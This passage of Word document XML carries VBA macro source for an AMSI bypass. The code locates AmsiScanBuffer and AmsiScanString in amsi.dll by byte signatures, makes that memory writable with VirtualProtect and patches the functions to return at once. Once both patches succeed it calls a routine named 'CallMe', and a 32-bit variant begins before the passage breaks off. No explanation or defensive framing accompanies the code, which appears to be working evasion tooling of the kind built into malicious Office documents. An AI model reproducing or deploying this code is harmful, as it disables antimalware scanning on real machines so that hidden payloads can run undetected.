                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="000E60E5">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="1934F915" w14:textId="77777777" w:rsidR="000E60E5" w:rsidRPr="000E60E5" w:rsidRDefault="000E60E5" w:rsidP="000E60E5">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="000E60E5">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t>Dim InstructionInStringOffset As Integer</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="204458BF" w14:textId="77777777" w:rsidR="000E60E5" w:rsidRPr="000E60E5" w:rsidRDefault="000E60E5" w:rsidP="000E60E5">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="000E60E5">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t>Dim Success As Integer</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="790D611D" w14:textId="77777777" w:rsidR="000E60E5" w:rsidRPr="000E60E5" w:rsidRDefault="000E60E5" w:rsidP="000E60E5">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="000E60E5">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="11538B8D" w14:textId="77777777" w:rsidR="000E60E5" w:rsidRPr="000E60E5" w:rsidRDefault="000E60E5" w:rsidP="000E60E5">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="000E60E5">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t>ScanBufferMagicBytes = "4C8BDC49895B08"</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="4D1D56FF" w14:textId="77777777" w:rsidR="000E60E5" w:rsidRPr="000E60E5" w:rsidRDefault="000E60E5" w:rsidP="000E60E5">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="000E60E5">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t>ScanStringMagicBytes = "4883EC384533DB"</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="799F4601" w14:textId="77777777" w:rsidR="000E60E5" w:rsidRPr="000E60E5" w:rsidRDefault="000E60E5" w:rsidP="000E60E5">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="000E60E5">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t>TrvOffset = 352</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="6E4D9E9A" w14:textId="77777777" w:rsidR="000E60E5" w:rsidRPr="000E60E5" w:rsidRDefault="000E60E5" w:rsidP="000E60E5">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="000E60E5">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t>Success = 0</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="32CA7F18" w14:textId="77777777" w:rsidR="000E60E5" w:rsidRPr="000E60E5" w:rsidRDefault="000E60E5" w:rsidP="000E60E5">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="000E60E5">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="1D7A8D05" w14:textId="77777777" w:rsidR="000E60E5" w:rsidRPr="000E60E5" w:rsidRDefault="000E60E5" w:rsidP="000E60E5">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="000E60E5">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t>LeakedAmsiDllAddr = LoadDll("amsi.dll", "AmsiUacInitialize")</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="0180AF5E" w14:textId="77777777" w:rsidR="000E60E5" w:rsidRPr="000E60E5" w:rsidRDefault="000E60E5" w:rsidP="000E60E5">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="000E60E5">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="40D4659E" w14:textId="77777777" w:rsidR="000E60E5" w:rsidRPr="000E60E5" w:rsidRDefault="000E60E5" w:rsidP="000E60E5">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="000E60E5">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t>LeakedBytesBuffer = GetBuffer(LeakedAmsiDllAddr, TrvOffset)</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="2F4B2848" w14:textId="77777777" w:rsidR="000E60E5" w:rsidRPr="000E60E5" w:rsidRDefault="000E60E5" w:rsidP="000E60E5">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="000E60E5">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="715514D7" w14:textId="77777777" w:rsidR="000E60E5" w:rsidRPr="000E60E5" w:rsidRDefault="000E60E5" w:rsidP="000E60E5">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="000E60E5">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t>InstructionInStringOffset = InStr(LeakedBytesBuffer, ScanBufferMagicBytes)</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="680D6F45" w14:textId="77777777" w:rsidR="000E60E5" w:rsidRPr="002F4DA3" w:rsidRDefault="000E60E5" w:rsidP="000E60E5">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="002F4DA3">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t>If InstructionInStringOffset = 0 Then</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="66728AF2" w14:textId="77777777" w:rsidR="000E60E5" w:rsidRPr="000E60E5" w:rsidRDefault="000E60E5" w:rsidP="000E60E5">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="002F4DA3">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t xml:space="preserve">    </w:t>
            </w:r>
            <w:r w:rsidRPr="000E60E5">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t>' MsgBox "We didn't find the scanbuffer magicbytes :/"</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="534960CC" w14:textId="77777777" w:rsidR="000E60E5" w:rsidRPr="000E60E5" w:rsidRDefault="000E60E5" w:rsidP="000E60E5">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="000E60E5">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t>Else</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="411347C1" w14:textId="77777777" w:rsidR="000E60E5" w:rsidRPr="000E60E5" w:rsidRDefault="000E60E5" w:rsidP="000E60E5">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="000E60E5">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t xml:space="preserve">    AmsiScanBufferPatchAddr = FindPatchOffset(LeakedAmsiDllAddr, TrvOffset, InstructionInStringOffset)</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="1BB48232" w14:textId="77777777" w:rsidR="000E60E5" w:rsidRPr="000E60E5" w:rsidRDefault="000E60E5" w:rsidP="000E60E5">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="000E60E5">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="76F36BC9" w14:textId="77777777" w:rsidR="000E60E5" w:rsidRPr="000E60E5" w:rsidRDefault="000E60E5" w:rsidP="000E60E5">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="000E60E5">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t xml:space="preserve">    Result = VirtualProtect(ByVal AmsiScanBufferPatchAddr, 32, 64, 0)</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="737B03FD" w14:textId="77777777" w:rsidR="000E60E5" w:rsidRPr="000E60E5" w:rsidRDefault="000E60E5" w:rsidP="000E60E5">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="000E60E5">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t xml:space="preserve">    ByteSwapper ByVal (AmsiScanBufferPatchAddr + 0), 1, Val("&amp;H" &amp; "90")</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="5154F86C" w14:textId="77777777" w:rsidR="000E60E5" w:rsidRPr="000E60E5" w:rsidRDefault="000E60E5" w:rsidP="000E60E5">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="000E60E5">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t xml:space="preserve">    ByteSwapper ByVal (AmsiScanBufferPatchAddr + 1), 1, Val("&amp;H" &amp; "C3")</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="43CB1649" w14:textId="77777777" w:rsidR="000E60E5" w:rsidRPr="000E60E5" w:rsidRDefault="000E60E5" w:rsidP="000E60E5">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="000E60E5">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t xml:space="preserve">    Success = Success + 1</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="6122BA32" w14:textId="77777777" w:rsidR="000E60E5" w:rsidRPr="000E60E5" w:rsidRDefault="000E60E5" w:rsidP="000E60E5">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="000E60E5">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t>End If</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="0C4DFB8A" w14:textId="77777777" w:rsidR="000E60E5" w:rsidRPr="000E60E5" w:rsidRDefault="000E60E5" w:rsidP="000E60E5">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="000E60E5">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="26B79BC6" w14:textId="77777777" w:rsidR="000E60E5" w:rsidRPr="000E60E5" w:rsidRDefault="000E60E5" w:rsidP="000E60E5">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="000E60E5">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="6CDFCF12" w14:textId="77777777" w:rsidR="000E60E5" w:rsidRPr="000E60E5" w:rsidRDefault="000E60E5" w:rsidP="000E60E5">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="000E60E5">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t>InstructionInStringOffset = InStr(LeakedBytesBuffer, ScanStringMagicBytes)</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="6117E511" w14:textId="77777777" w:rsidR="000E60E5" w:rsidRPr="000E60E5" w:rsidRDefault="000E60E5" w:rsidP="000E60E5">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="000E60E5">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t>If InstructionInStringOffset = 0 Then</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="6CBB9D02" w14:textId="77777777" w:rsidR="000E60E5" w:rsidRPr="000E60E5" w:rsidRDefault="000E60E5" w:rsidP="000E60E5">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="000E60E5">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t xml:space="preserve">    ' MsgBox "We didn't find the scanstring magicbytes :/"</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="74833BC7" w14:textId="77777777" w:rsidR="000E60E5" w:rsidRPr="000E60E5" w:rsidRDefault="000E60E5" w:rsidP="000E60E5">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="000E60E5">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t>Else</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="69992A6A" w14:textId="77777777" w:rsidR="000E60E5" w:rsidRPr="000E60E5" w:rsidRDefault="000E60E5" w:rsidP="000E60E5">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="000E60E5">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t xml:space="preserve">    AmsiScanStringPatchAddr = FindPatchOffset(LeakedAmsiDllAddr, TrvOffset, InstructionInStringOffset)</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="33FD1EB8" w14:textId="77777777" w:rsidR="000E60E5" w:rsidRPr="000E60E5" w:rsidRDefault="000E60E5" w:rsidP="000E60E5">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="000E60E5">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="10903623" w14:textId="77777777" w:rsidR="000E60E5" w:rsidRPr="000E60E5" w:rsidRDefault="000E60E5" w:rsidP="000E60E5">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="000E60E5">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t xml:space="preserve">    Result = VirtualProtect(ByVal AmsiScanStringPatchAddr, 32, 64, 0)</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="0779A686" w14:textId="77777777" w:rsidR="000E60E5" w:rsidRPr="000E60E5" w:rsidRDefault="000E60E5" w:rsidP="000E60E5">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="000E60E5">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t xml:space="preserve">    ByteSwapper ByVal (AmsiScanStringPatchAddr + 0), 1, Val("&amp;H" &amp; "90")</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="60F612EF" w14:textId="77777777" w:rsidR="000E60E5" w:rsidRPr="000E60E5" w:rsidRDefault="000E60E5" w:rsidP="000E60E5">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="000E60E5">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t xml:space="preserve">    ByteSwapper ByVal (AmsiScanStringPatchAddr + 1), 1, Val("&amp;H" &amp; "C3")</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="5B4133C3" w14:textId="77777777" w:rsidR="000E60E5" w:rsidRPr="000E60E5" w:rsidRDefault="000E60E5" w:rsidP="000E60E5">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="000E60E5">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t xml:space="preserve">    Success = Success + 1</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="6F6BB0FB" w14:textId="77777777" w:rsidR="000E60E5" w:rsidRPr="000E60E5" w:rsidRDefault="000E60E5" w:rsidP="000E60E5">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="000E60E5">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t>End If</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="117171AA" w14:textId="77777777" w:rsidR="000E60E5" w:rsidRPr="000E60E5" w:rsidRDefault="000E60E5" w:rsidP="000E60E5">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="000E60E5">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="48225090" w14:textId="77777777" w:rsidR="000E60E5" w:rsidRPr="000E60E5" w:rsidRDefault="000E60E5" w:rsidP="000E60E5">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="000E60E5">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t>If Success = 2 Then</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="67797AED" w14:textId="77777777" w:rsidR="000E60E5" w:rsidRPr="000E60E5" w:rsidRDefault="000E60E5" w:rsidP="000E60E5">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="000E60E5">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t xml:space="preserve">    Call CallMe</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="3A6DD567" w14:textId="77777777" w:rsidR="000E60E5" w:rsidRPr="000E60E5" w:rsidRDefault="000E60E5" w:rsidP="000E60E5">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="000E60E5">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t>End If</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="22A09B33" w14:textId="77777777" w:rsidR="000E60E5" w:rsidRPr="000E60E5" w:rsidRDefault="000E60E5" w:rsidP="000E60E5">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="000E60E5">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="066EB1A6" w14:textId="77777777" w:rsidR="000E60E5" w:rsidRPr="000E60E5" w:rsidRDefault="000E60E5" w:rsidP="000E60E5">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="000E60E5">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t>End Sub</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="5FA1D0AB" w14:textId="77777777" w:rsidR="000E60E5" w:rsidRPr="000E60E5" w:rsidRDefault="000E60E5" w:rsidP="000E60E5">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="000E60E5">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="5DCF2622" w14:textId="77777777" w:rsidR="000E60E5" w:rsidRPr="000E60E5" w:rsidRDefault="000E60E5" w:rsidP="000E60E5">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="000E60E5">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t>Sub x32_office()</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="6EF6C369" w14:textId="77777777" w:rsidR="000E60E5" w:rsidRPr="000E60E5" w:rsidRDefault="000E60E5" w:rsidP="000E60E5">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="000E60E5">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="0BB383EA" w14:textId="77777777" w:rsidR="000E60E5" w:rsidRPr="000E60E5" w:rsidRDefault="000E60E5" w:rsidP="000E60E5">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="000E60E5">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t>Dim LeakedAmsiDllAddr As LongPtr</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="00D869B9" w14:textId="77777777" w:rsidR="000E60E5" w:rsidRPr="000E60E5" w:rsidRDefault="000E60E5" w:rsidP="000E60E5">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="000E60E5">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="095C9D27" w14:textId="77777777" w:rsidR="000E60E5" w:rsidRPr="000E60E5" w:rsidRDefault="000E60E5" w:rsidP="000E60E5">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="000E60E5">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t>Dim ScanBufferMagicBytes As String</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="41058476" w14:textId="77777777" w:rsidR="000E60E5" w:rsidRPr="000E60E5" w:rsidRDefault="000E60E5" w:rsidP="000E60E5">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="000E60E5">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t>Dim ScanStringMagicBytes As String</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="0BB7770D" w14:textId="77777777" w:rsidR="000E60E5" w:rsidRPr="000E60E5" w:rsidRDefault="000E60E5" w:rsidP="000E60E5">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="000E60E5">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t>Dim LeakedBytesBuffer As String</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="185EF728" w14:textId="77777777" w:rsidR="000E60E5" w:rsidRPr="000E60E5" w:rsidRDefault="000E60E5" w:rsidP="000E60E5">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="000E60E5">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t>Dim AmsiScanBufferPatchAddr As LongPtr</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="0E3C6D4F" w14:textId="77777777" w:rsidR="000E60E5" w:rsidRPr="000E60E5" w:rsidRDefault="000E60E5" w:rsidP="000E60E5">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="000E60E5">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t>Dim AmsiScanStringPatchAddr As LongPtr</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="3F3A36E2" w14:textId="77777777" w:rsidR="000E60E5" w:rsidRPr="000E60E5" w:rsidRDefault="000E60E5" w:rsidP="000E60E5">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="000E60E5">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t>Dim TrvOffset As Integer</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="37584502" w14:textId="77777777" w:rsidR="000E60E5" w:rsidRPr="000E60E5" w:rsidRDefault="000E60E5" w:rsidP="000E60E5">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="000E60E5">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="505C2D73" w14:textId="77777777" w:rsidR="000E60E5" w:rsidRPr="000E60E5" w:rsidRDefault="000E60E5" w:rsidP="000E60E5">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="000E60E5">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t>Dim InstructionInStringOffset As Integer</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="7B4878CE" w14:textId="77777777" w:rsidR="000E60E5" w:rsidRPr="000E60E5" w:rsidRDefault="000E60E5" w:rsidP="000E60E5">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="000E60E5">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t>Dim Success As Integer</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="264F637C" w14:textId="77777777" w:rsidR="000E60E5" w:rsidRPr="000E60E5" w:rsidRDefault="000E60E5" w:rsidP="000E60E5">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="000E60E5">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="4EA84E35" w14:textId="77777777" w:rsidR="000E60E5" w:rsidRPr="000E60E5" w:rsidRDefault="000E60E5" w:rsidP="000E60E5">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="000E60E5">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t>ScanBufferMagicBytes = "8B450C85C0745A85DB"</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="29CD3001" w14:textId="77777777" w:rsidR="000E60E5" w:rsidRPr="000E60E5" w:rsidRDefault="000E60E5" w:rsidP="000E60E5">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="000E60E5">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t>ScanStringMagicBytes = "8B550C85D27434837D"</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="3FB76DA8" w14:textId="77777777" w:rsidR="000E60E5" w:rsidRPr="000E60E5" w:rsidRDefault="000E60E5" w:rsidP="000E60E5">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="000E60E5">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t>TrvOffset = 300</w:t>
            </w:r>
          </w:p>
